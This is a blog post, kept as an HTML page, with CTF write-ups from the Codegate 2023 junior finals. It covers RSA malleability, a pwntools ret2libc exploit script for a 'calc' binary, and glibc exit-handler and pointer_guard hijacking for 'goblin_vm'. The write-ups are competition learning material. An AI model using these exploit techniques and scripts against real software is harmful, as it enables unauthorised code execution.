<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Codegate Finals 2023 (Juniors) | zhiren</title>
<meta name="keywords" content="pwn, writeups">
<meta name="description" content="my experience at codegate 2023 finals, and writeups for junior challs">
<meta name="author" content="">
<link rel="canonical" href="https://zhirenliew.github.io/posts/codegate_finals23/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.bff9ea534f65d95fa54e4acbb4245968e8f466efcde15f973a90ca891dd8766e.css" integrity="sha256-v/nqU09l2V&#43;lTkrLtCRZaOj0Zu/N4V&#43;XOpDKiR3Ydm4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://zhirenliew.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://zhirenliew.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://zhirenliew.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://zhirenliew.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://zhirenliew.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-XHJYTREZSC"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-XHJYTREZSC', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="Codegate Finals 2023 (Juniors)" />
<meta property="og:description" content="my experience at codegate 2023 finals, and writeups for junior challs" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://zhirenliew.github.io/posts/codegate_finals23/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-09-03T09:38:30+00:00" />
<meta property="article:modified_time" content="2023-09-03T09:38:30+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Codegate Finals 2023 (Juniors)"/>
<meta name="twitter:description" content="my experience at codegate 2023 finals, and writeups for junior challs"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Posts",
      "item": "https://zhirenliew.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Codegate Finals 2023 (Juniors)",
      "item": "https://zhirenliew.github.io/posts/codegate_finals23/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Codegate Finals 2023 (Juniors)",
  "name": "Codegate Finals 2023 (Juniors)",
  "description": "my experience at codegate 2023 finals, and writeups for junior challs",
  "keywords": [
    "pwn", "writeups"
  ],
  "articleBody": " Overview Last week, I traveled to Seoul, Korea to compete in this year‚Äôs codegate junior finals, and I finished at 8th out of 20 finalists.\nI managed to solve 2 pwns and 1 crypto chall, and this blog post will contain the writeups for all three of them. All attachments can be found here.\nBackstory you can skip this part and go straight to the writeups if you‚Äôd like to\nThe top 20 players from the codegate junior qualifiers were invited to the finals. I performed very badly in the qualifiers, and if I remember correctly I actually was 27th right before the ctf ended. I was pretty dissapointed in myself after the ctf cause I specifically told myself to dive into kernel pwn and windows rev before the qualifiers, but I kept being lazy and in the end I didn‚Äôt really try them out. And guess what, there was an easy kernel pwn chall and easy windows reversing chall in the qualifiers, which would guarantee me a spot in the finals had I solved any one of them, and I ended up solving none of them simply because I had no experience in any of them.\nBy the end of the ctf, I finished at 25th (not because I gained any more points, but because of the whole Hall of Shame thing), and the top 25 players were supposed to send them a writeup. I was pretty devastated at this point but I figured I just quickly write the writeup and send it to them for maybe a slight chance of me being able to go to the finals. I wanted to keep the hope alive.\nAnd to my suprise, I got an email from codegate at the end of June asking if I wanted to go to the finals. I was ecstatic and couldn‚Äôt believe that I actually got this opportunity. I told myself that this was a chance to redeem myself, and to not make the same mistakes I made before. I aimed for top 3, and practiced and learned as much as I could before the finals.\nIn the end, I got 8th, which is not bad and definitely an improvement, but still I kinda feel like I could‚Äôve done a bit better. I was actually 3rd at the last few hours of the ctf, but I guess I didn‚Äôt push myself hard enough near the end and was a bit too complacent cause I didn‚Äôt solve anything else afterwards. Had I started working on the misc chall I was working on a bit earlier, maybe I could‚Äôve solved it and gotten like top 4. Nevertheless, this was still an incredible experience, and Im very grateful for having this opportunity.\nEnough waffling, time to actually get to the writeups.\nezRSA (crypto) ezRsa.py #!/usr/bin/python3 import os import gmpy2 import random import sys import pathlib from Crypto.PublicKey import RSA def welcome(): text = ''' ,, ,, .M\"\"\"bgd db `7MM `7MM\"\"\"Mq. .M\"\"\"bgd db ,MI \"Y MM MM `MM. ,MI \"Y ;MM: `MMb. `7MM `7MMpMMMb.pMMMb. `7MMpdMAo. MM .gP\"Ya MM ,M9 `MMb. ,V^MM. `YMMNq. MM MM MM MM MM `Wb MM ,M' Yb MMmmdM9 `YMMNq. ,M `MM . `MM MM MM MM MM MM M8 MM 8M\"\"\"\"\"\" MM YM. . `MM AbmmmqMA Mb dM MM MM MM MM MM ,AP MM YM. , MM `Mb. Mb dM A' VML P\"Ybmmd\" .JMML..JMML JMML JMML. MMbmmd'.JMML.`Mbmmd' .JMML. .JMM.P\"Ybmmd\" .AMA. .AMMA. MM .JMML. ''' print(text) rsa_key = RSA.generate(1024) return rsa_key def get_int_length(num:int): import math return int(math.ceil(num.bit_length() / 8)) def RSAencrypt(plaintext:bytes, e:int, N:int): int_plaintext = int.from_bytes(plaintext, 'big') ciphertext = pow(int_plaintext, e, N) return ciphertext.to_bytes(get_int_length(ciphertext),'big').hex() def RSAdecrypt(ciphertext:bytes, d:int, N:int): int_ciphertext = int.from_bytes(ciphertext, 'big') message = pow(int_ciphertext, d, N) return message.to_bytes(get_int_length(message), 'big') def action_seeflag(key): flagfile = pathlib.Path(\"/home/ctf/flag\") with open (flagfile, 'r') as f: flag = f.read() data = flag.encode().hex().encode() result = RSAencrypt(data, key.e, key.n) print(f\"FLAG is {result}\") return def action_encrypt(key:RSA.RsaKey): user_inp = input(\"write plain text(hex string format): \") userInput_hex = bytes.fromhex(user_inp) result = RSAencrypt(userInput_hex, key.e, key.n) print(f\"[*] Done! Here is!\\n {result}\") return def action_decrypt(key): ciphertext = input(\"write ciphertext with hex string format: \") flagfile = pathlib.Path(\"/home/ctf/flag\") with open (flagfile, 'r') as f: cmp_flag = f.read() data = cmp_flag.encode().hex().encode() userInput_hex = bytes.fromhex(ciphertext) decrypted_data = RSAdecrypt(userInput_hex, key.d, key.n) if(RSAencrypt(data, key.e, key.n) == ciphertext): print(\"Don't decrypt encrpted flag...\") return print(f\"[*] decrypt result =\u003e {decrypted_data.hex()}\") def main(rsakey): action = int(input(\"1. encrypt\\n2. decrypt\\n3. see top secret\\n4. exit\\n\u003e \")) if action == 1: action_encrypt(rsakey) elif action == 2: action_decrypt(rsakey) elif action == 3: action_seeflag(rsakey) elif action == 4: print(\"byebye!\") sys.exit() else: print(\"Invalid input!!\") if __name__ == '__main__': initkey = welcome() for _ in range(100000): print(\"\\nYou can encrypt / decrypt with my SIMPLE RSA!\") try: main(initkey) except Exception as e: print(e) You can see the encrypted flag, and can encrypt and decrypt any message except for the encrypted flag. A quick google search showed me this writeup.\nSince RSA is malleable, we could produce a ciphertext in a way such that the decrypted plaintext is related to the flag.\nFrom the writeup:\nct_flag = encrypt(flag) = flag^e mod n ct_two = encrypt(2) = 2^e mod n ct_not_flag = ct_flag*ct_two = (flag*2)^e mod n decrypted(ct_not_flag) = flag*2 calc (pwn) checksec:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled note():\nvoid note(void) { ssize_t sVar1; char buf [44]; int local_c; memset(buf,0,0x20); printf(\"Note\u003e \"); sVar1 = read(0,buf,0x100); local_c = (int)sVar1; if (buf[local_c + -1] == '\\n') { buf[local_c + -1] = '\\0'; } memcpy(notepad,buf,(long)local_c); printf(\"Notepad: %s\\n\",notepad); return; } There is an obvious buffer overflow here. With stack canaries off, we just need a leak of either PIE or libc to just ROP and get shell.\ncalc() void calc(void) { size_t sVar1; undefined8 uVar2; memset(expression,0,0x100); printf(\"Formula\u003e \"); fgets(expression,0x100,stdin); sVar1 = strlen(expression); if (notepad[sVar1 + 0xff] == '\\n') { sVar1 = strlen(expression); notepad[sVar1 + 0xff] = 0; } uVar2 = evaluateExpression(); printf(\"Result\u003e %ld\\n\",uVar2); return; } long evaluateExpression(void) { // ghidra showed more vars here but I deleted them to make it cleaner here long local_988 [256]; char local_188 [264]; memset(local_188,0,0x100); memset(local_988,0,0x800); operatorTop = -1; operandTop = -1; i = 0; do { uVar6 = SEXT48(i); sVar4 = strlen(expression); if (sVar4 \u003c= uVar6) { while (-1 \u003c operatorTop) { lVar5 = (long)operatorTop; local_21 = local_188[lVar5]; iVar1 = operandTop + -1; local_30 = local_988[operandTop]; operandTop = operandTop + -2; local_38 = local_988[iVar1]; operatorTop = operatorTop + -1; local_40 = calculate(local_38,local_30,(int)local_188[lVar5],local_30); operandTop = operandTop + 1; local_988[operandTop] = local_40; } return local_988[operandTop]; } local_41 = expression[i]; ppuVar3 = __ctype_b_loc(); if (((*ppuVar3)[local_41] \u0026 0x800) == 0) { if (local_41 == '(') { operatorTop = operatorTop + 1; local_188[operatorTop] = '('; } else { if (local_41 == ')') { while ((-1 \u003c operatorTop \u0026\u0026 (local_188[operatorTop] != '('))) { lVar5 = (long)operatorTop; local_61 = local_188[lVar5]; iVar1 = operandTop + -1; local_70 = local_988[operandTop]; operandTop = operandTop + -2; local_78 = local_988[iVar1]; operatorTop = operatorTop + -1; local_80 = calculate(local_78,local_70,(int)local_188[lVar5],local_70); operandTop = operandTop + 1; local_988[operandTop] = local_80; } if ((-1 \u003c operatorTop) \u0026\u0026 (local_188[operatorTop] == '(')) { operatorTop = operatorTop + -1; } } else { if ((((local_41 == '+') || (local_41 == '-')) || (local_41 == '*')) || ((local_41 == '/' || (local_41 == '^')))) { while (-1 \u003c operatorTop) { iVar1 = getPriority((int)local_188[operatorTop]); iVar2 = getPriority((int)local_41); if (iVar1 \u003c iVar2) break; lVar5 = (long)operatorTop; local_42 = local_188[lVar5]; iVar1 = operandTop + -1; local_50 = local_988[operandTop]; operandTop = operandTop + -2; local_58 = local_988[iVar1]; operatorTop = operatorTop + -1; local_60 = calculate(local_58,local_50,(int)local_188[lVar5],local_50); operandTop = operandTop + 1; local_988[operandTop] = local_60; } operatorTop = operatorTop + 1; local_188[operatorTop] = local_41; } } } } else { local_20 = 0; while ((uVar6 = SEXT48(i), sVar4 = strlen(expression), uVar6 \u003c sVar4 \u0026\u0026 (ppuVar3 = __ctype_b_loc(), ((*ppuVar3)[(char)expression[i]] \u0026 0x800) != 0))) { local_20 = (long)((char)expression[i] + -0x30) + local_20 * 10; i = i + 1; } operandTop = operandTop + 1; local_988[operandTop] = local_20; i = i + -1; } i = i + 1; } while( true ); } I actually didn‚Äôt fully reverse the evaluateExpression function as it was dense. I saw that it called __ctype_b_loc(), and assumed that it checked if the char in the expression was a digit or a symbol. I went to test this out by typing A-1 in the calculator, and a large number was outputted. I turned the number to hex and it was a PIE leak.\nGlad I didn‚Äôt have to reverse the evaluateExpression function :))\nI then tried to find a pop rdi; ret gadget in the binary to pop a GOT address into rdi and then just ret to puts@plt to leak libc, but no such gadget was found. I then breakpointed at the ret instruction inside note() to see what the registers are like when we control ret, and\n[ Legend: Modified register | Code | Heap | Stack | String ] ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ registers ‚îÄ‚îÄ‚îÄ‚îÄ $rax : 0x37 $rbx : 0x0 $rcx : 0x00007ffff7ea7a37 ‚Üí 0x5177fffff0003d48 (\"H=\"?) $rdx : 0x0 $rsp : 0x00007fffffffe2d8 ‚Üí \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]\" $rbp : 0x4141414141414141 (\"AAAAAAAA\"?) $rsi : 0x00007fffffffc180 ‚Üí \"Notepad: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]\" $rdi : 0x00007fffffffc060 ‚Üí 0x00007ffff7df50d0 ‚Üí endbr64 $rip : 0x0000555555555ac9 ‚Üí ret $r8 : 0x37 $r9 : 0x7fffffff $r10 : 0x0 $r11 : 0x246 $r12 : 0x00007fffffffe408 ‚Üí 0x00007fffffffe66e ‚Üí \"/home/vagrant/ctf/finals_codegate23/calculator/cal[...]\" $r13 : 0x0000555555555b58 ‚Üí endbr64 $r14 : 0x0000555555557d78 ‚Üí 0x0000555555555220 ‚Üí \u003c__do_global_dtors_aux+0\u003e endbr64 $r15 : 0x00007ffff7ffd040 ‚Üí 0x00007ffff7ffe2e0 ‚Üí 0x0000555555554000 ‚Üí jg 0x555555554047 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 rdi is already pointing to a libc address.\nSo I just ret to puts@plt to leak libc, and then ret back to _start (entry point) to restart the program, and then just ret2libc.\nexploit.py from pwn import * #io = process(\"./calc\") io = remote(\"13.125.200.127\",8888) libc = ELF(\"./libc.so.6\") io.sendlineafter(\"command\u003e\",\"calc\") io.sendlineafter(\"Formula\u003e\",\"A\") io.recvuntil(\"Result\u003e \") pieBase = int(io.recvline()[:-1]) - 5951 log.info(\"PIE BASE: \" + hex(pieBase)) putsPlt = p64(pieBase + 0x10e0) entry = p64(pieBase + 0x1180) rop = b\"A\" * 56 + putsPlt + entry io.sendlineafter(\"command\u003e\",\"note\") io.sendlineafter(\"Note\u003e\",rop) io.recvline() libc.address = u64(io.recv(6).ljust(8,b\"\\x00\")) - libc.symbols[\"funlockfile\"] log.info(\"LIBC BASE: \" + hex(libc.address)) popRdi = p64(libc.address + 0x2a3e5) ret = p64(pieBase + 0x1be9) rop2 = b\"A\"*56 + ret + popRdi + p64(next(libc.search(b\"/bin/sh\"))) + p64(libc.symbols[\"system\"]) io.sendlineafter(\"command\u003e\",\"note\") io.sendlineafter(\"Note\u003e\",rop2) io.interactive() I actually managed to get first blood for this chall, and for the whole pwn category, which is my first ever first blood ü©∏!\ngoblin_vm (pwn) checksec:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled src.c undefined8 main(void){ bool bVar1; undefined isLargeRoom; char *untilSpaceStr; long in_FS_OFFSET; undefined4 local_828; int instr; undefined4 *mallocChunk; char code [2056]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); setup(); isLargeRoom = askRoom(); room = giveRoom(isLargeRoom); bVar1 = false; local_828 = 1; mallocChunk = (undefined4 *)malloc(4); *mallocChunk = 1; do { memset(code,0,0x800); getInput(code); untilSpaceStr = strtok(code,\" \"); instr = atoi(untilSpaceStr); switch(instr) { case 1: instr1(); break; case 2: instr2(); break; case 3: instr3(); break; case 4: instr4(); break; case 5: instr5(); break; case 6: instr6(); break; case 7: instr7(); break; case 8: instr8(); break; case 9: instr9(); break; case 10: instr10(mallocChunk,\u0026local_828,\u0026local_828); break; case 0xb: bVar1 = true; } } while (!bVar1); if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return 0; } undefined8 askRoom(void){ ssize_t sVar1; undefined8 uVar2; long in_FS_OFFSET; char local_118 [264]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); puts(\"Hi, Do you want a large room? [y/N]\"); sVar1 = read(0,local_118,10); if (sVar1 == -1) { exit(-1); } if ((local_118[0] == 'y') || (local_118[0] == 'Y')) { uVar2 = 1; } else { uVar2 = 0; } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return uVar2; } long giveRoom(char param_1){ void *pvVar1; size_t local_18; if (param_1 == '\\0') { local_18 = 0x100000; } else { local_18 = 0x400000; } pvVar1 = calloc(local_18,1); return (long)pvVar1 + (local_18 \u003e\u003e 1); } The binary is an implementation of the classic stack machine.\nIt first asks if you would want a large room (room here is refering to the vm‚Äôs stack/memory), and will calloc(0x400000) if you answer ‚ÄòY‚Äô, and calloc(0x100000) if you answer anything else. Since the malloc request sizes are so large, the chunk is actually not allocated at the heap, but instead fulfilled using mmap(), having the memory map being allocated right above libc. This means that the room/vm‚Äôs stack is right above libc.\nIt then asks for instructions in a while loop, expecting input in the form of: opcode arg.\nSo for example: 1 9\nLet‚Äôs look at what the instructions actually do:\nvoid instr1(void){ // push reg onto stack room = (room - 8); *room = reg; return; } void instr2(void){ // pop value on top of stack into reg reg = *room; // qword room = room + 1; // ptr addition, so actually + 8 return; } void instr3(void){ // reg++ reg = reg + 1; // actually add 1 return; } void instr4(void){ // reg-- reg = reg - 1; return; } void instr5(void){ // 5 123 // reg += 123 __nptr = strtok(0x0,\" \"); lVar1 = atoll(__nptr); reg = reg + lVar1; return; } void instr6(void){ // 6 123 // reg -= 123 __nptr = strtok((char *)0x0,\" \"); lVar1 = atoll(__nptr); reg = reg - lVar1; return; } void instr7(void){ // 7 123 // reg = 123 char *__nptr; __nptr = strtok((char *)0x0,\" \"); reg = atoll(__nptr); return; } void instr8(void){ // 8 123 // room += 123 __nptr = strtok((char *)0x0,\" \"); lVar1 = atoll(__nptr); room = lVar1 + room; return; } void instr9(void){ // 9 123 // room -= 123 __nptr = strtok((char *)0x0,\" \"); lVar1 = atoll(__nptr); room = room - lVar1; return; } void instr10(int *param_1,int *param_2){ // a leak // a global variable, a stack variable, and a heap variable is set to 1 if (((DAT_00104010 == 1) \u0026\u0026 (*param_1 == 1)) \u0026\u0026 (*param_2 == 1)) { printf(\"rax: %ld\\n\",reg); DAT_00104010 = 0; *param_1 = 0; *param_2 = 0; } return; } So room is essentially $rsp, and reg is essentially $rax.\nThere are simple push and pop instructions, and instructions to manipulate both the registers. There‚Äôs also an instruction to print out the value of reg, but it can only be called once. There‚Äôs 3 booleans, 1 in the .data segment, 1 in the stack, and 1 in the heap, that all become true when the print instruction is called.\nThe obvious vulnerability here is that there are completely no bounds check on where you can move room. And since room is right above libc, you can easily move room into libc and leak an address, and overwrite libc structures stored in libc memory. You wouldn‚Äôt need any leaks to do that since room is relative to libc_base, and other libc addresses, meaning that everytime the binary is ran, the offset between room and let‚Äôs say main_arena is the same. (Assuming you choose the same room size,big/small, everytime.)\nExploitation ideas You could of course try to overwrite the ret pointer of main and just try to ret2libc, but for that to work you have to move room-\u003estack, and in order to do that you have to know\nwhere room is where the stack is However, you only have one leak.\nTechnically, you could try to overwrite the global boolean, the stack boolean, and maybe overwrite the heap chunk pointer on the stack so that it points to other memory in order to execute instruction 10 more. But the problem is for that to work you have to leak libc,pie,and stack, which is ultimately what we can‚Äôt do, and is trying to do.\nSo you essentially can‚Äôt move to other sections of memory (like stack, heap, .data etc) since you would need 2 leaks to do that, and can only move around libc memory.\nAt first I tried the naive idea of overwriting the vtable pointer of the stdout FILE structure in libc (_IO_2_1_stdout_), by leaking a libc address, calculating the address of system, and making my own vtable at the default location of room (where room was initially at in the beginning). But this exploit didn‚Äôt work, and instead printed out\nFatal error: glibc detected an invalid stdio handle\nas there was a mitigation applied after glibc 2.24, that checks the address of vtable before any virtual functions are called.\nI tried googling around and looking for ways to bypass this, and found some writeups, one of which being this. But all the writeups seemed quite old, I quickly scrolled through them and I didn‚Äôt really have much faith on them working on glibc 2.35.\nSo I went back to square one and kept thinking of other exploitation ideas.\nAbusing exit handlers I actually first thought about abusing exit handlers after I finished analysing the binary since I explored the technique quite recently. But I thought that that idea wasn‚Äôt possible since exit() wasn‚Äôt called, and I quickly dismissed the idea.\nAfter failing to do the vtable overwrite however, I revisited this idea, and wondered whether exit was still called by libc after main returned, and guess what, exit was indeed called.\nIf you‚Äôre not familliar with this technique, I recommend reading this article\nEssentially exit() is just a wrapper function for:\n__run_exit_handlers (status, \u0026__exit_funcs, true, true);\nAnd in libc memory, there is a variable called __exit_funcs, which is an exit_function_list structure. __exit_funcs points to the head of a linked list, that contains multiple exit_function objects. (One linked list element has multiple exit_function objects, when more exit_function objects are required, another linked list element will be created).\nWhen __run_exit_handlers(‚Ä¶) is called, all the function pointers in the exit_function objects will be called. There are multiple flavors/types of exit_function objects that are all treated slightly differently by __run_exit_handlers(‚Ä¶), (I recommend reading the article to learn more), but the flavor we‚Äôre gonna look into is the cxa flavor.\nThis is because by default, there will be already an exit_function object registered in the list, which contains the function pointer of _dl_fini(), and that exit_function object is of the flavor cxa.\nIn the libc source code, the definition of the cxa exit_function struct is\nstruct exit_function { long int flavor; ... // I redacted a lot of parts for simplicity, read the article for clearer full view struct { void (*fn) (void *arg, int status); void *arg; void *dso_handle; } cxa; ... }; In memory, everything looks something like:\n0x7ffff7fac838 \u003c__exit_funcs\u003e: 0x00007ffff7fadf00 ... 0x00007ffff7fadf00 ‚îÇ+0x0000: 0x0000000000000000 0x00007ffff7fadf08 ‚îÇ+0x0008: 0x0000000000000001 0x00007ffff7fadf10 ‚îÇ+0x0010: 0x0000000000000004 - 0x00007ffff7fadf18 ‚îÇ+0x0018: 0x93b315d57adee436 |--- one exit_function object 0x00007ffff7fadf20 ‚îÇ+0x0020: 0x0000000000000000 | 0x00007ffff7fadf28 ‚îÇ+0x0028: 0x0000000000000000 - 0x00007ffff7fadf30 ‚îÇ+0x0030: 0x0000000000000000 As you can see, the _dl_fini function pointer is mangled, this is a mitigation by libc to prevent exit handlers being so easily abused.\nThe mangling is essentially done with:\n// let rdx = function xor rdx,QWORD PTR fs:0x30 rol rdx,0x11 What‚Äôs inside fs:0x30 is called the pointer_guard, which is just 16 random bytes.\nWhen I was reading the article, I questioned what was the fs register used for, and what it was pointing at. A quick google search showed me this, which said that the fs register is used to point at the TLS (Thread Local Storage), which I assume is to store thread information.\nBack to the challange What I could do is just overwrite the _dl_fini exit_function object, with the mangled address of system, and an address to /bin/sh underneath it. But the question is, how can I mangle the address of system?\nHow the article defeated pointer mangling was by leaking the mangled _dl_fini address, and doing\nptr_guard = ror(ptr_encoded, 0x11, 64) ^ _dl_fini # this works because # _dl_fini = ror(mangled_ptr) ^ ptr_guard # ptr_guard = _dl_fini ^ ror(mangled_ptr) However for this to work, you would need two leaks, one to leak libc, one to leak the mangled_ptr. Thankfully when I was reading through @nobodyisnobody‚Äôs writeup collection, I came across this writeup, which defeated the pointer_guard by overwriting it in the TLS.\nshoutout to @nobodyisnobody btw, I‚Äôve learned quite a bit of stuff from his writeups\nHowever when I first read this writeup before the ctf, I tried to explore this idea by finding where the TLS is in gdb to look at the object, but everytime I tried to view the fs register\ngef‚û§ print $fs $1 = 0x0 I revisited this idea during the ctf, and thankfully I came across this writeup, which printed out the fs register in gdb using\ngef‚û§ print $fs_base $1 = 0x7ffff7d90740 The TLS is in libc memory! So now I can calculate the constant offset from libc base to TLS, and overwrite the pointer_guard to 0. Then I overwrote the mangled _dl_fini address into rol(system,0x11,64), and then wrote the default address of room right underneath it, and put the ‚Äú/bin/sh‚Äù string at the default location of room.\nExploit worked, and shell popped. Gg.\nMinor inconveniences atoll() is used in the vm‚Äôs instructions when loading numbers into the reg, so the maximum number you could load was 0x7fffffffffffffff since a signed long is read. This was a problem when I was writing the rol(system), as the addresses were generally \u003e 0x7fffffffffffffff. I got around this by using two writes to write the rol(system) addres. After the ctf, I talked to @samuzora, and he had the idea to just use negative numbers to do the write, which is a much cleaner approach compared to mine.\nMy exploit worked locally, but kept failing remotely. I kept getting:\ntimeout: the monitored command dumped core /home/ctf/run.sh: line 2: 573 Illegal instruction timeout 60 /home/ctf/goblin_vm I contacted the organizers and they said that the chall had no problems.\nI investigated it using a docker container, and it seems like my libc leaks were inconsistent. Iirc, I was leaking libc addresses from the region at around libc_base+0x219000. I changed my exploit to leak from the default vtable of libc. So note to self, don‚Äôt leak random libc addresses found in libc next time, leak libc function symbols instead.\nAnother approach I also talked to @pepsipu after the ctf, and he actually solved this chall by overwriting the stdout FILE structure. What he did was enable full buffering on by overwriting the FILE object flags with Or(default flags,0x1800), which tells the stdout object to dump its buffer before printing. He then pops the IO_write_end pointer to reg, add it with 0x7000, then overwrote the IO_write_end pointer with the new value. This will make the IO object to believe the end of the buffer is much further than it actually is.\nWhen printf is called, the IO object will flush the buffer and print out everything between IO_write_base and IO_write_end, and thus leaking everything you‚Äôll ever need.\nHe then just does a simple ret2libc to get shell.\nCool technique.\nConclusion This was my first ever irl ctf event, and I enjoyed it very much. I met tons of cool skilled people, and got a few cool stickers too. I strongly believe that this is the first to many irl ctfs, and I‚Äôll work hard to get stronger and more skillful to make this true.\nThanks to the organizers for holding such a great event, and I hope I can go to more onsite finals soon and meet more cool people soon.\nepicHaxorl337swag!1! ",
  "wordCount" : "3855",
  "inLanguage": "en",
  "datePublished": "2023-09-03T09:38:30Z",
  "dateModified": "2023-09-03T09:38:30Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://zhirenliew.github.io/posts/codegate_finals23/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "zhiren",
    "logo": {
      "@type": "ImageObject",
      "url": "https://zhirenliew.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://zhirenliew.github.io" accesskey="h" title="zhiren (Alt + H)">zhiren</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://zhirenliew.github.io/about/" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://zhirenliew.github.io">Home</a>&nbsp;¬ª&nbsp;<a href="https://zhirenliew.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      Codegate Finals 2023 (Juniors)
    </h1>
